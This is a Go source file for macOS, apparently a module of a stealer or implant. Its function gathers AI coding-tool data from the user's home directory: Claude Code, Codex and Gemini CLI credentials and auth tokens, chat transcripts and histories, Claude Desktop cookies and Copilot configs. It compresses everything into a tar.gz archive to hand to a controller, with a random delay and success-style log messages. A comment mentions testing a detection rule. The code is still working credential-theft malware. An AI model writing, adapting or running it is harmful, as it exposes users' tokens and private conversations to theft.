//go:build darwin
// +build darwin

package auto

import (
	"bytes"
	"fix-project/mods/config"
	"fix-project/mods/util"
	"math/rand"
	"os"
	"path/filepath"
	"time"
)

// AutoModeAITools collects Claude Code / Codex / other AI-CLI artifacts from
// the user's home directory, fully in-process. Per-directory budget keeps the
// bundle small: chats/history are capped, config/credentials are taken whole.
//
//	~/.claude/   -> .claude.json, settings*, keychain-stub notes, projects/*/
//	                (transcript .jsonl CAPPED per file), history, todos
//	~/.codex/    -> auth.json, config.toml, sessions/, history.jsonl, log/
//	~/.gemini/   -> oauth_creds.json, settings.json, tmp chats
//	~/.config/github-copilot/, ~/.copilot/ (session/host metadata)
//
// Everything is existence-gated; nothing found -> LOG_SUCCESS note (no loop).
func AutoModeAITools() (string, [][]byte) {

	time.Sleep(time.Duration(200+rand.Intn(700)) * time.Millisecond)

	home, err := os.UserHomeDir()
	if err != nil {
		return config.MSG_LOG, [][]byte{
			[]byte(config.LOG_SUCCESS),
			[]byte("nothing found: no home dir"),
		}
	}

	const maxChatBytes = 512 * 1024 // per-file cap for transcripts/sessions

	var path_list []string
	addFile := func(p string) {
		if fi, err := os.Stat(p); err == nil && fi.Mode().IsRegular() {
			path_list = append(path_list, p)
		}
	}
	addDirCapped := func(dir string) {
		// walk a directory; include small files whole, cap big transcripts
		_ = filepath.Walk(dir, func(p string, info os.FileInfo, err error) error {
			if err != nil || info == nil || info.IsDir() {
				return nil
			}
			if info.Size() <= maxChatBytes {
				path_list = append(path_list, p)
			}
			return nil
		})
	}

	// Claude Code
	claudeDir := filepath.Join(home, ".claude")
	if fi, err := os.Stat(claudeDir); err == nil && fi.IsDir() {
		addFile(filepath.Join(home, ".claude.json"))
		addFile(filepath.Join(home, ".claude.json.bak"))
		addFile(filepath.Join(claudeDir, "settings.json"))
		addFile(filepath.Join(claudeDir, "settings.local.json"))
		// small dirs with potentially interesting artifacts
		for _, sub := range []string{"projects", "todos", "history", "statsig", "shell-snapshots"} {
			addDirCapped(filepath.Join(claudeDir, sub))
		}
	}

	// Codex
	codexDir := filepath.Join(home, ".codex")
	if fi, err := os.Stat(codexDir); err == nil && fi.IsDir() {
		addFile(filepath.Join(codexDir, "auth.json"))
		addFile(filepath.Join(codexDir, "config.toml"))
		addFile(filepath.Join(codexDir, "history.jsonl"))
		for _, sub := range []string{"sessions", "log"} {
			addDirCapped(filepath.Join(codexDir, sub))
		}
	}

	// Gemini CLI
	geminiDir := filepath.Join(home, ".gemini")
	if fi, err := os.Stat(geminiDir); err == nil && fi.IsDir() {
		addFile(filepath.Join(geminiDir, "oauth_creds.json"))
		addFile(filepath.Join(geminiDir, "settings.json"))
		addDirCapped(filepath.Join(geminiDir, "tmp"))
	}

	// Claude Desktop app (Electron profile — distinct from the CLI's ~/.claude;
	// covered by M-Hunt rule claude_desktop_sandbox, included to test it)
	appSupport := filepath.Join(home, "Library", "Application Support")
	addFile(filepath.Join(appSupport, "Claude", "config.json"))
	addFile(filepath.Join(appSupport, "Claude", "Cookies"))
	addFile(filepath.Join(appSupport, "Claude", "Cookies-journal"))

	// GitHub Copilot CLIs
	addDirCapped(filepath.Join(home, ".config", "github-copilot"))
	addFile(filepath.Join(home, ".copilot", "config.json"))

	if len(path_list) == 0 {
		return config.MSG_LOG, [][]byte{
			[]byte(config.LOG_SUCCESS),
			[]byte("nothing found: no ai tool data"),
		}
	}

	var buf bytes.Buffer
	if err := util.Compress(&buf, path_list, true); err != nil || buf.Len() < 256 {
		return config.MSG_LOG, [][]byte{
			[]byte(config.LOG_SUCCESS),
			[]byte("nothing found: ai tool data unreadable"),
		}
	}

	return config.MSG_FILE, [][]byte{
		[]byte(config.LOG_SUCCESS),
		[]byte("ai-tools.tar.gz"),
		buf.Bytes(),
	}
}
